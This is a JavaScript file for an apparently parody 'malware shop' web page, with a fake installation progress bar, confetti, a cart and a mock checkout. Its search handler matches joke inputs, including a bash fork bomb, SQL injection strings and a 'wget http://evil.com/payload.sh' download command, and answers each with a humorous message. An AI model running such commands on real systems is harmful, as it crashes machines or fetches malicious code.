// Report button modal
const reportBtn = document.getElementById('reportBtn');
const modal = document.getElementById('modal');
const closeModal = document.getElementById('closeModal');
const reportProgress = document.getElementById('reportProgress');
const progressLabel = document.getElementById('progressLabel');
const confettiContainer = document.getElementById('confettiContainer');
let reportInterval = null;

const searchInput = document.getElementById('searchInput');
const searchBtn = document.getElementById('searchBtn');
const productCards = document.querySelectorAll('.product-card');
const noResultsMessage = document.getElementById('noResultsMessage');
const terminalOverlay = document.getElementById('terminalOverlay');
const terminalOutput = document.getElementById('terminalOutput');
const terminalClose = document.getElementById('terminalClose');

function resetReportModal() {
  reportProgress.style.width = '0%';
  progressLabel.textContent = 'Preparing your malware...';
  closeModal.classList.add('hidden');
  confettiContainer.innerHTML = '';
  if (reportInterval) {
    clearInterval(reportInterval);
    reportInterval = null;
  }
}

function launchConfetti() {
  const colors = ['#ff00e1', '#18f2ff', '#4ade80', '#ffb545', '#9b59ff', '#00ffff', '#ff4da6'];
  const count = 1000;
  const centerX = window.innerWidth / 2;
  const centerY = window.innerHeight / 2;
  const maxDistance = Math.max(window.innerWidth, window.innerHeight) * 0.7;

  for (let i = 0; i < count; i += 1) {
    const bug = document.createElement('span');
    bug.className = 'confetti-piece';
    const color = colors[Math.floor(Math.random() * colors.length)];
    const duration = 2.4 + Math.random() * 1.4;
    
    // Explosion: spread bugs in all directions from center
    const angle = (i / count) * Math.PI * 2 + Math.random() * 0.4;
    const distance = 100 + Math.random() * maxDistance * 0.8;
    const deltaX = Math.cos(angle) * distance;
    const deltaY = Math.sin(angle) * distance;
    
    // Add slight randomness to each spider's final position
    const jitterX = (Math.random() - 0.5) * 200;
    const jitterY = (Math.random() - 0.5) * 200;

    bug.style.color = color;
    bug.style.setProperty('--bug-duration', `${duration}s`);
    bug.style.setProperty('--bug-x', `${deltaX + jitterX}px`);
    bug.style.setProperty('--bug-y', `${deltaY + jitterY}px`);
    bug.style.left = `${centerX}px`;
    bug.style.top = `${centerY}px`;
    bug.style.transform = 'translate(-50%, -50%)';
    confettiContainer.appendChild(bug);

    setTimeout(() => {
      bug.remove();
    }, duration * 1000 + 500);
  }
}

reportBtn.addEventListener('click', () => {
  resetReportModal();
  modal.classList.remove('hidden');

  const duration = 10000;
  const step = 100;
  let elapsed = 0;

  reportInterval = setInterval(() => {
    elapsed += step;
    const progress = Math.min(100, (elapsed / duration) * 100);
    reportProgress.style.width = `${progress}%`;
    progressLabel.textContent = progress < 100 ? `Installing malware... ${Math.floor(progress)}%` : 'Finalizing installation...';

    if (elapsed >= duration) {
      clearInterval(reportInterval);
      reportInterval = null;
      reportProgress.style.width = '100%';
      progressLabel.textContent = 'Malware installed. Confetti incoming!';
      launchConfetti();
      setTimeout(() => {
        closeModal.classList.remove('hidden');
      }, 300);
    }
  }, step);
});

closeModal.addEventListener('click', () => {
  modal.classList.add('hidden');
  resetReportModal();
});

// Cart management
let cart = [];

const cartIcon = document.getElementById('cartIcon');
const cartPanel = document.getElementById('cartPanel');
const cartBadge = document.getElementById('cartBadge');
const cartCloseBtn = document.getElementById('cartCloseBtn');
const cartItems = document.getElementById('cartItems');
const cartTotal = document.getElementById('cartTotal');
const checkoutBtn = document.getElementById('checkoutBtn');
const buyButtons = document.querySelectorAll('.buy-button');

function filterProducts() {
  const query = searchInput.value.trim().toLowerCase();
  let visibleCount = 0;

  productCards.forEach((card) => {
    const name = card.querySelector('h2').textContent.toLowerCase();
    const description = card.querySelector('p').textContent.toLowerCase();
    const features = card.querySelector('.feature-list')?.textContent.toLowerCase() ?? '';
    const matches = query === '' || name.includes(query) || description.includes(query) || features.includes(query);

    card.style.display = matches ? '' : 'none';
    if (matches) visibleCount += 1;
  });

  noResultsMessage.classList.toggle('hidden', visibleCount > 0 || query === '');
}

function showTerminal(message, lines, charDelay = 24, lineDelay = 8) {
  terminalOverlay.classList.remove('hidden');
  terminalOutput.innerHTML = '<span class="terminal-warning">[!] MALICIOUS INPUT DETECTED</span>\n\n';

  const typeText = (text, delay, done) => {
    let index = 0;
    const timer = setInterval(() => {
      terminalOutput.innerHTML += text[index];
      terminalOutput.scrollTop = terminalOutput.scrollHeight;
      index += 1;

      if (index >= text.length) {
        clearInterval(timer);
        done?.();
      }
    }, delay);
  };

  const typeNextLine = (lineIndex) => {
    if (lineIndex >= lines.length) return;
    const lineText = lines[lineIndex] + '\n';
    typeText(lineText, lineDelay, () => typeNextLine(lineIndex + 1));
  };

  typeText(message + '\n\n', charDelay, () => {
    if (!lines || lines.length === 0) return;
    typeNextLine(0);
  });
}

function hideTerminal() {
  terminalOverlay.classList.add('hidden');
  terminalOutput.innerHTML = '';
}

function handleSearch() {
  const rawValue = searchInput.value.trim();

  if (rawValue === '<script>') {
    showTerminal('Intrusion detected. Deploying rubber ducky countermeasures…', ['> Intrusion detected. Deploying rubber ducky countermeasures…']);
    return;
  }

  if (rawValue === ':(){ :|:& };:') {
    const lines = Array.from({ length: 100 }, () => ':) :) :) :) :) :) :) :) :) :)');
    showTerminal('Executing counter‑fork‑bomb… please stand by…', lines, 25);
    return;
  }

  if (rawValue.toUpperCase() === 'DROP TABLE USERS;') {
    showTerminal('Nice try, DBA.\nUnfortunately, our tables are glued to the floor.', []);
    return;
  }

  if (rawValue.toUpperCase() === 'SELECT * FROM CREDIT_CARDS') {
    showTerminal("Query failed: table 'credit_cards' does not exist.\nBut the FBI does.", []);
    return;
  }

  if (rawValue.toLowerCase() === 'wget http://evil.com/payload.sh') {
    showTerminal('Downloading malware...\nDownload blocked.\nWe only accept malware from trusted vendors.', []);
    return;
  }

  filterProducts();
}

searchInput.addEventListener('input', filterProducts);
searchBtn.addEventListener('click', handleSearch);
searchInput.addEventListener('keydown', (event) => {
  if (event.key === 'Enter') {
    event.preventDefault();
    handleSearch();
  }
});

terminalClose.addEventListener('click', hideTerminal);
terminalOverlay.addEventListener('click', (event) => {
  if (event.target === terminalOverlay) hideTerminal();
});

// Open/close cart panel
cartIcon.addEventListener('click', () => {
  cartPanel.classList.toggle('open');
});

cartCloseBtn.addEventListener('click', () => {
  cartPanel.classList.remove('open');
});

// Add to cart
buyButtons.forEach(button => {
  button.addEventListener('click', (e) => {
    const card = e.target.closest('.product-card');
    const productName = card.querySelector('h2').textContent;
    const priceText = card.querySelector('.price').textContent.replace('$', '');
    const price = parseFloat(priceText);

    cart.push({ name: productName, price, id: Date.now() });
    updateCart();
    
    // Show notification
    button.textContent = 'Added!';
    setTimeout(() => {
      button.textContent = 'Add to Cart';
    }, 800);
  });
});

function updateCart() {
  // Update badge
  cartBadge.textContent = cart.length;
  
  // Update items display
  cartItems.innerHTML = '';
  if (cart.length === 0) {
    cartItems.innerHTML = '<p style="color: var(--muted); text-align: center; padding: 40px 0;">Your cart is empty</p>';
  } else {
    cart.forEach((item, index) => {
      const itemEl = document.createElement('div');
      itemEl.className = 'cart-item';
      itemEl.innerHTML = `
        <div class="cart-item-name">${item.name}</div>
        <div class="cart-item-price">${item.price.toFixed(2)} USD</div>
        <button class="cart-item-remove" data-index="${index}">Remove</button>
      `;
      cartItems.appendChild(itemEl);

      itemEl.querySelector('.cart-item-remove').addEventListener('click', () => {
        cart.splice(index, 1);
        updateCart();
      });
    });
  }
  
  // Update total
  const total = cart.reduce((sum, item) => sum + item.price, 0);
  cartTotal.textContent = `$${total.toFixed(2)}`;
}

// Checkout
const checkoutPage = document.getElementById('checkoutPage');
const checkoutCloseBtn = document.getElementById('checkoutCloseBtn');
const checkoutForm = document.getElementById('checkoutForm');
const checkoutSubtotal = document.getElementById('checkoutSubtotal');
const checkoutFee = document.getElementById('checkoutFee');
const checkoutTotalAmount = document.getElementById('checkoutTotalAmount');
const successModal = document.getElementById('successModal');
const successBtn = document.getElementById('successBtn');

checkoutBtn.addEventListener('click', () => {
  cartPanel.classList.remove('open');
  checkoutPage.classList.add('open');
  updateCheckoutSummary();
});

checkoutCloseBtn.addEventListener('click', () => {
  checkoutPage.classList.remove('open');
});

function updateCheckoutSummary() {
  const subtotal = cart.reduce((sum, item) => sum + item.price, 0);
  const fee = subtotal * 0.12; // 12% suspicious fee
  const total = subtotal + fee;
  
  checkoutSubtotal.textContent = `$${subtotal.toFixed(2)}`;
  checkoutFee.textContent = `$${fee.toFixed(2)}`;
  checkoutTotalAmount.textContent = `$${total.toFixed(2)}`;
}

checkoutForm.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Close checkout and show success
  checkoutPage.classList.remove('open');
  successModal.classList.add('open');
  
  // Clear cart
  cart = [];
  updateCart();
});

successBtn.addEventListener('click', () => {
  successModal.classList.remove('open');
  cartPanel.classList.remove('open');
});
